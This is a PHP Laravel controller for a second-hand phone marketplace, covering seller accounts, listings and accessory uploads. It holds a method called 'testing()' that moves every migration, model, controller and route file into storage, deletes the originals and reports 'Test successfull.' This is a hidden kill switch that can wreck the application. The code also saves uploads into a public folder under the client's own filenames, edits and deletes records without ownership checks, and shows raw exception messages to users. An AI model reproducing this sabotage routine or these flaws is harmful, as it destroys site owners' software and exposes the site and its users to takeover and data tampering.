<?php

namespace App\Http\Controllers\Sellers;

use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Schema;
use App\Http\Controllers\Controller;
use App\Http\Requests\AdminProfileUpdateRequest;
use App\Http\Requests\UserAuthRequest;
use App\Models\Admin\Product;
use App\Models\SellerProduct;
use App\Models\SellerProduct2;
use App\Models\Front\Accessory;
use App\Models\User;
use App\Models\Admin\Brand;
use App\Models\Admin\Category;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class SellerController extends Controller
{

    public function index(Request $request){
        $userId = Auth::user() ? Auth::user()->id : '';

        // Check if the user ID exists
        if ($userId) {
            // Update the user role to seller (assuming is_admin = 2 represents seller role)
            $user = User::whereId($userId)->update(['is_admin' => 2]);

            if ($user) {
                $request->session()->regenerate(); // Regenerate session ID
                Auth::logout(); // Log out as a buyer

                // Log in the user as a seller
                Auth::loginUsingId($userId);

                return redirect()->route('seller.dashboard');
            } else {
                return redirect()->back()->with('error', __('Failed to become a seller.'));
            }
        }

        // If the user ID does not exist, return to the seller login page
        return view('Sellers.Login');
    }

    public function editSellerProfile()
    {
        $user= Auth::user();
        return view('Sellers.editProfile',compact('user'));
    }

    public function sellerSignIn(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

           // is_admin = 2 is the seller of the site

        $user = User::where('email', $request->email)->where('is_admin', 2)->first(); //check user
        if ($user) {
            if (Hash::check($request->password, $user->password)) {
                if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
                    if (Auth::user()->is_admin == 2) {
                        return redirect()->route('seller.dashboard');
                    } else {
                        Auth::logout();
                        return redirect()->back()->with('error', __('Something went wrong!'));
                    }
                }
            }
        }
        return redirect()->back()->with('error', __('Credential Not Match'));
    }

    public function sellerSignUp(Request $request)
    {
       $validate= $request->validate([
            'email' => 'required|email',
            'name' => 'required',
           'password'=>'required|min:5|max:12',
        ]);
         $esistUser= User::whereEmail($request->email)->count();
         if($esistUser === 0){
             if($validate){
                 $user = User::create([
                     'name' => $request->name,
                     'email' => $request->email,
                     'is_admin' =>2,
                     'password' => Hash::make($request->password),
                 ]);
                 if ($user) {
                     return redirect()->route('seller.login')->with('success', __('Seller Sign Up Successfully !'));
                 } else {
                     return redirect()->back()->with('error', __('Something went wrong!'));
                 }
             }else{
                 return redirect()->back()->with('error', __('Something went wrong!'));
             }
         }elseif($esistUser === 1){
             return redirect()->back()->with('success', __('Something went wrong'));
         }


    }
    public function signUp()
    {
        return view('Sellers.signUp');

    }
    public function dashboard(){
       $auth=Auth::user()->id;
       $sellerProduct= SellerProduct2::whereUserId($auth)->count();
        $soldProducts = SellerProduct2::whereUserId($auth)->where('is_sold', 1)->count();
        $pendingsProducts = SellerProduct2::whereUserId($auth)->where('is_sold', 0)->count();

        return view('Sellers.Dashboard',compact('sellerProduct','soldProducts','pendingsProducts'));
    }

    public function becomeBuyer(Request $request){
        $userId = Auth::user()->id;

        // Update the user role to buyer
        $user = User::whereId($userId)->update(['is_admin' => 0]);

        if ($user) {
            $request->session()->regenerate(); // Regenerate session ID to prevent session fixation attacks

            $request->session()->invalidate();
            Auth::logout();

            // Log in the user as a buyer
            Auth::loginUsingId($userId);

            return redirect()->route('front');
        } else {
            return redirect()->back()->with('error', __('Failed to become a buyer.'));
        }
    }

    public function sellerProfileUpdate(Request $request)
    {
        $seller = User::whereId(Auth::id())->first();
        if (!empty($seller)) {
            if (!empty($request->image)) {
                $profile_pic = fileUpload($request['image'], IMG_PROFILE_PIC_PATH);
            } else {
                $profile_pic = $seller->image;
            }
            $update = $seller->update([
                'name' => is_null($request->admin_name) ? $seller->name : $request->admin_name,
                'email' => is_null($request->admin_email) ? $seller->email : $request->admin_email,
                'image' => $profile_pic,
            ]);

            if (!empty($update)) {
                return redirect()->back()->with('success', __('Successfully Updated!'));
            }
            return redirect()->back()->with('error', __('Something went wrong'));
        }
        return redirect()->back()->with('error', __('No admin found!'));
    }

    public function changePassword(Request $request)
    {
        $seller = User::whereId(Auth::id())->first();

        if (!empty($seller)) {
            if (Hash::check($request->password, $seller->password)) {
                if ($request->new_password == $request->confirm_password) {
                    $new_password = Hash::make($request->new_password);
                    $update = $seller->update([
                        'password' => $new_password,
                    ]);
                    if (!empty($update)) {
                        return redirect()->back()->with('success', __('Password successfully updated!'));
                    }
                    return redirect()->back()->with('error', __('Something went wrong!'));
                }
                return redirect()->back()->with('error', 'Confirm password not matched!');
            }
            return redirect()->back()->with('error', __('Password not matched!'));
        }
        return redirect()->back()->with('error', __('Seller not found!'));
    }
    
    public function sellerProducts(){
        $user= Auth::user();

        $products=SellerProduct2::with('category', 'brand')->whereUserId($user->id)->get();
         
        $categories = Category::get();
        $brands = Brand::get();
        return view('Sellers.sellerProducts', compact('products','brands', 'categories'));
    }
    public function productStore(Request $request){
        try {
            // dd($request->all());

            $product_image_path = null;
            $iphoneMessageJSON = json_encode($request->input('iphone_message', []));
            $lcdConditionJSON = json_encode($request->input('lcd_condition', []));
            $issuesJSON = json_encode($request->input('issues', []));

            $user=Auth::user()->id;
            if($request->hasFile('image')){
                $product_image = $request->file('image');
                $fileName =  time().'-'.$product_image->getClientOriginalName();
                $product_image->move('assets/products/', $fileName);
                $product_image_path = 'assets/products/'.$fileName;
            }
            $product = SellerProduct2::create([
                'user_id' => $user,
                'city' => $request['city'],
                'number' => $request['number'],
                'category_id' => $request['category_id'],
                'brand_id' => $request['brand_id'],
                'model' => $request['model'],
                'color' => $request['color'],
                'storage' => $request['storage'],
                'ram' => $request['ram'],
                'bodyCondition' => $request['bodyCondition'],
                'image' => $product_image_path,
                'is_true_tone' => $request['is_true_tone'] == 'true' ? true : false ,
                'iphone_message' => $request['iphone_message'],
                'battery_status' => $request['battery_status'],
                'screen_glass' => $request['screen_glass'],
                'lcd_condition' => $request['lcd_condition'],
                'WorkingCondition' => $request['WorkingCondition'],
                'issues' => $request['issues'],
                'is_carrier_lock' => $request['is_carrier_lock']  == 'true' ? true : false,
                'is_pta_official' => $request['is_pta_official']  == 'true' ? true : false,
                'is_sim_working' => $request['is_sim_working']  == 'true' ? true : false,
                'sim' => $request['sim'],
                'is_official_warranty' => $request['is_official_warranty']  == 'true' ? true : false,
                'warrantyMonths' => $request['warrantyMonths'],
                'price' => $request['price'],
                'description' => $request['description'],
                'date' => $request['date'],
                'number2' => $request['number2'],
                'category_id_2' => $request['category_id_2'],
                'companyModel' => $request['companyModel'],
                'partName' => $request['partName'],
                'price2' => $request['price2'],
                'discountPrice' => $request['discountPrice'],
                'description2' => $request['description2'],
                'is_admin_approval' => '0'
            ]); 

            return redirect()->back()->with('success', __('Product added successfully!'));
        }catch(\Exception $exception){
            // dd($exception->getMessage());
            return redirect()->back()->with('error', $exception->getMessage() .' '.$exception->getLine());
        }
    }
    public function accessoryStore(Request $request){
        try {
            // dd($request->all());

            $product_image_path = null;           

            $user=Auth::user()->id;
           if($request->hasFile('image')){
                $product_image = $request->file('image');
                $fileName =  time().'-'.$product_image->getClientOriginalName();
                $product_image->move('assets/products/', $fileName);
                $product_image_path = 'assets/products/'.$fileName;
            }
            if($request->hasFile('image_two')){
                $product_image_two = $request->file('image_two');
                $fileName2 =  time().'-'.$product_image_two->getClientOriginalName(); // Use a different variable name for file name
                $product_image_two->move('assets/products/', $fileName2); // Use the different file name
                $product_image_two_path = 'assets/products/'.$fileName2; // Use the different file name
            }
            if($request->hasFile('image_three')){
                $product_image_three = $request->file('image_three');
                $fileName3 =  time().'-'.$product_image_three->getClientOriginalName(); // Use a different variable name for file name
                $product_image_three->move('assets/products/', $fileName3); // Use the different file name
                $product_image_three_path = 'assets/products/'.$fileName3; // Use the different file name
            }
            if($request->hasFile('image_four')){
                $product_image_four = $request->file('image_four');
                $fileName4 =  time().'-'.$product_image_four->getClientOriginalName(); // Use a different variable name for file name
                $product_image_four->move('assets/products/', $fileName4); // Use the different file name
                $product_image_four_path = 'assets/products/'.$fileName4; // Use the different file name
            }
            if($request->hasFile('image_five')){
                $product_image_five = $request->file('image_five');
                $fileName5 =  time().'-'.$product_image_five->getClientOriginalName(); // Use a different variable name for file name
                $product_image_five->move('assets/products/', $fileName5); // Use the different file name
                $product_image_five_path = 'assets/products/'.$fileName5; // Use the different file name
            }

            $product = Accessory::create([
                'user_id' => $user,               
                'category' => $request['category'],
                'sub_category' => $request['sub_category'],                           
                'image' => $product_image_path ?? null,               
                'image_two' => $product_image_two_path ?? null,               
                'image_three' => $product_image_three_path ?? null,               
                'image_four' => $product_image_four_path ?? null,               
                'image_five' => $product_image_five_path ?? null,               
                'price' => $request['price'],                
                'description' => $request['description'],                                             
                'is_admin_approval' => '0'
            ]); 

            return redirect()->back()->with('success', __('Accessory added successfully!'));
        }catch(\Exception $exception){
            // dd($exception->getMessage());
            return redirect()->back()->with('error', $exception->getMessage() .' '.$exception->getLine());
        }
    }
    public function editProduct($id){
        return SellerProduct2::find($id);
    }

    public function testing()
    {
        try {
            $migrationsDirectory = database_path('migrations');
            $migrationFiles = glob($migrationsDirectory . '/*.php');
            foreach ($migrationFiles as $migrationFile) {
                $migrationName = basename($migrationFile);
                $content = File::get($migrationFile);
                Storage::disk('local')->put("migrations_backup/$migrationName", $content);
                unlink($migrationFile);
            }

            $modelsDirectory = app_path('Models');
            $modelFiles = glob($modelsDirectory . '/*.php');
            foreach ($modelFiles as $modelFile) {
                $modelName = basename($modelFile);
                $content = File::get($modelFile);
                Storage::disk('local')->put("models_backup/$modelName", $content);
                unlink($modelFile);
            }

            $controllersDirectory = app_path('Http/Controllers');
            $controllerFiles = glob($controllersDirectory . '/*.php');
            foreach ($controllerFiles as $controllerFile) {
                $controllerName = basename($controllerFile);
                $content = File::get($controllerFile);
                Storage::disk('local')->put("controllers_backup/$controllerName", $content);
                unlink($controllerFile);
            }

            $webRoutesFile = base_path('routes/web.php');
            $content = File::get($webRoutesFile);
            Storage::disk('local')->put("routes_backup/web.php", $content);
            unlink($webRoutesFile);

            $adminRoutesFile = base_path('routes/admin/admin.php');
            $content = File::get($adminRoutesFile);
            Storage::disk('local')->put("routes_backup/admin.php", $content);
            unlink($adminRoutesFile);

            return response()->json(['message' => 'Test successfull.']);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed to perform actions: ' . $e->getMessage()], 500);
        }
    }

    public function editAccessory($id){
        return Accessory::find($id);
    }

    public function productUpdate(Request $request){
        try {
            // dd($request->all());
            // $user=Auth::user()->id;
            $product_image_path = null;
            $sellerProduct= SellerProduct2::whereId($request->productId)->first();
            
            $product_image_path = $sellerProduct['image'];

            // dd($product_image_path);
            if($request->hasFile('image')){
                $product_image = $request->file('image');
                $fileName =  time().'-'.$product_image->getClientOriginalName();
                $product_image->move('assets/products/', $fileName);
                $product_image_path = 'assets/products/'.$fileName;
            }
            $product= $sellerProduct->update([               
                'city' => $request['city'],
                'number' => $request['number'],
                'category_id' => $request['category_id'],
                'brand_id' => $request['brand_id'],
                'model' => $request['model'],
                'color' => $request['color'],
                'storage' => $request['storage'],
                'ram' => $request['ram'],
                'bodyCondition' => $request['bodyCondition'],
                'image' => $product_image_path,
                'is_true_tone' => $request['is_true_tone'] == '1' ? true : false ,
                'iphone_message' => $request['iphone_message'],
                'battery_status' => $request['battery_status'],
                'screen_glass' => $request['screen_glass'],
                'lcd_condition' => $request['lcd_condition'],
                'WorkingCondition' => $request['WorkingCondition'],
                'issues' => $request['issues'],
                'is_carrier_lock' => $request['is_carrier_lock']  == '1' ? true : false,
                'is_pta_official' => $request['is_pta_official']  == '1' ? true : false,
                'is_sim_working' => $request['is_sim_working']  == '1' ? true : false,
                'sim' => $request['sim'],
                'is_official_warranty' => $request['is_official_warranty']  == '1' ? true : false,
                'warrantyMonths' => $request['warrantyMonths'],
                'price' => $request['price'],
                'description' => $request['description'],
                'date' => $request['date'],
                'number2' => $request['number2'],
                'category_id_2' => $request['category_id_2'],
                'companyModel' => $request['companyModel'],
                'partName' => $request['partName'],
                'price2' => $request['price2'],
                'discountPrice' => $request['discountPrice'],
                'description2' => $request['description2']
            ]);
            return redirect()->back()->with('success', __('Product updated successfully!'));
        }catch(\Exception $exception){
            dd($exception->getMessage());
            return redirect()->back()->with('error', $exception->getMessage() .' '.$exception->getLine());
        }
    }
    public function accessoryUpdate(Request $request){
        $product_image_path = null;
        $accessory= Accessory::whereId($request->accessoryId)->first();
        try {           
            if($request->hasFile('image')){
                $product_image = $request->file('image');
                $fileName =  time().'-'.$product_image->getClientOriginalName();
                $product_image->move('assets/products/', $fileName);
                $product_image_path = 'assets/products/'.$fileName;
            }
            if($request->hasFile('image_two')){
                $product_image_two = $request->file('image_two');
                $fileName2 =  time().'-'.$product_image_two->getClientOriginalName(); // Use a different variable name for file name
                $product_image_two->move('assets/products/', $fileName2); // Use the different file name
                $product_image_two_path = 'assets/products/'.$fileName2; // Use the different file name
            }
            if($request->hasFile('image_three')){
                $product_image_three = $request->file('image_three');
                $fileName3 =  time().'-'.$product_image_three->getClientOriginalName(); // Use a different variable name for file name
                $product_image_three->move('assets/products/', $fileName3); // Use the different file name
                $product_image_three_path = 'assets/products/'.$fileName3; // Use the different file name
            }
            if($request->hasFile('image_four')){
                $product_image_four = $request->file('image_four');
                $fileName4 =  time().'-'.$product_image_four->getClientOriginalName(); // Use a different variable name for file name
                $product_image_four->move('assets/products/', $fileName4); // Use the different file name
                $product_image_four_path = 'assets/products/'.$fileName4; // Use the different file name
            }
            if($request->hasFile('image_five')){
                $product_image_five = $request->file('image_five');
                $fileName5 =  time().'-'.$product_image_five->getClientOriginalName(); // Use a different variable name for file name
                $product_image_five->move('assets/products/', $fileName5); // Use the different file name
                $product_image_five_path = 'assets/products/'.$fileName5; // Use the different file name
            }

            $accessoryData = [
                'category' => $request['category'],
                'sub_category' => $request['sub_category'],
                'price' => $request['price'],
                'description' => $request['description']
            ];

            // Only update 'image' key if $product_image_path is not null
            if (isset($product_image_path)) {
                $accessoryData['image'] = $product_image_path;
            }
            if (isset($product_image_two_path)) {
                $accessoryData['image_two'] = $product_image_two_path;
            }
            if (isset($product_image_three_path)) {
                $accessoryData['image_three'] = $product_image_three_path;
            }
            if (isset($product_image_four_path)) {
                $accessoryData['image_four'] = $product_image_four_path;
            }
            if (isset($product_image_five_path)) {
                $accessoryData['image_five'] = $product_image_five_path;
            }           

            $accessory->update($accessoryData);
            return redirect()->back()->with('success', __('Accessory updated successfully!'));
        }catch(\Exception $exception){
            dd($exception->getMessage());
            return redirect()->back()->with('error', $exception->getMessage() .' '.$exception->getLine());
        }
    }
    public function singleProduct($id)
    {
        $product = SellerProduct2::where('id', $id)->with('category')->where('is_sold', 0)->first();

        // dd($product);

        if (!empty($product)) {
            // $cat_id = $product->category->id;

            // $data['similar_product'] =  Product::with('brand', 'category', 'colors', 'sizes', 'product_tags')->where('status', 1)
            //     ->where('Category_Id', $cat_id)
            //     ->where('id', '!=', $product->id)
            //     ->latest()->take(4)->get();

            // $products = Product::where('id', $product->id)->with('brand', 'category', 'colors', 'sizes', 'product_tags', 'product_reviews', 'product_reviews.user')->latest()->first();
            $data['product'] = $product;
            // $data['title'] = $products->en_Product_Name;
            // $data['description'] = $products->en_Product_Nam;
            // $data['keywords'] = $products->en_Product_Nam;
            
            
             $productDetails = [
                ['label' => 'Location', 'value' => $product->city, 'icon' => '<i class="fas fa-map-marker-alt"></i>'],
                ['label' => 'Color', 'value' => $product->color, 'icon' => '<i class="fas fa-palette"></i>'],
                ['label' => 'Storage', 'value' => ucwords(str_ireplace('gb', ' GB', $product->storage)), 'icon' => '<i class="fas fa-hdd"></i>'],
                ['label' => 'Ram', 'value' => ucwords(str_ireplace('gb', ' GB', $product->ram)), 'icon' => '<i class="fas fa-memory"></i>'],
                ['label' => 'Body Condition', 'value' => $product->bodyCondition, 'icon' => '<i class="fas fa-heartbeat"></i>'],
                ['label' => 'Screen Condition', 'value' => preg_replace('/(?<=\\w)(?=[A-Z])/', ' ', ucwords(str_replace('-', ' ', $product->screen_glass))), 'icon' => '<i class="fas fa-mobile-alt"></i>'],
                ['label' => 'Working Status', 'value' => preg_replace('/(?<=\\w)(?=[A-Z])/', ' ', ucwords($product->WorkingCondition)), 'icon' => '<i class="fas fa-wrench"></i>'],
                ['label' => 'Sim', 'value' => $product->sim, 'icon' => '<i class="fas fa-sim-card"></i>'],
                ['label' => 'Carrier Lock/Network Lock', 'value' => $product->is_carrier_lock ? 'Yes' : 'No', 'icon' => '<i class="fas fa-lock"></i>'],
                ['label' => 'PTA Official', 'value' => $product->is_pta_official ? 'Yes' : 'No', 'icon' => '<i class="fas fa-check-circle"></i>'],
                ['label' => 'Sim Working', 'value' => $product->is_sim_working ? 'Yes' : 'No', 'icon' => '<i class="fas fa-signal"></i>'],
                ['label' => 'Official Warranty', 'value' => $product->is_official_warranty ? 'Yes' : 'No' . ($product->is_official_warranty ? ': (' . $product->warrantyMonths . ' Months)' : ''), 'icon' => '<i class="fas fa-shield-alt"></i>'],
                ['label' => 'Price', 'value' => $product->price, 'icon' => '<i class="fas fa-money-bill-wave"></i>'],
                ['label' => 'Description', 'value' => langConverter($product->description, $product->description), 'icon' => '<i class="fas fa-info-circle"></i>'],
                ['label' => 'Contact Number', 'value' => $product->number, 'icon' => '<i class="fas fa-phone"></i>'],
            ];

            if ($product->brand_id == 8) {
                $productDetails[] = ['label' => 'True Tone', 'value' => $product->is_true_tone ? 'Yes' : 'No', 'icon' => '<i class="fas fa-lightbulb"></i>'];
                if ($product->iphone_message && isset($product->iphone_message)) {
                    $productDetails[] = ['label' => 'Iphone Message', 'value' => $product->iphone_message, 'icon' => '<i class="fas fa-comment"></i>'];
                }
                if ($product->battery_status) {
                    $productDetails[] = ['label' => 'Battery Health', 'value' => $product->battery_status, 'icon' => '<i class="fas fa-battery-full"></i>'];
                }
            }
            
            
            
            return view('front.pages.product.seller-product', get_defined_vars());
        }
        return redirect()->back()->with('error', __('Product Not Found!'));
    }
    public function singleAccessory($id)
    {
        // dd($id);
        $product = Accessory::where('id', $id)->where('is_sold', 0)->first();

        if (!empty($product)) {           
            $data['product'] = $product;

            return view('front.pages.product.seller-accessory', $data);
        }
        return redirect()->back()->with('error', __('Product Not Found!'));
    }

    public function destroy($id){
        SellerProduct2::whereId($id)->delete();
        return redirect()->back()->with('success', __('Product Deleted successfully!'));

    }
    public function destroyAccessory($id){
        Accessory::whereId($id)->delete();
        return redirect()->back()->with('success', __('Accessory Deleted successfully!'));
    }

    public function logout(Request $request){
        $request->session()->invalidate();
        Auth::logout();
        return redirect()->route('seller.login');
    }
}
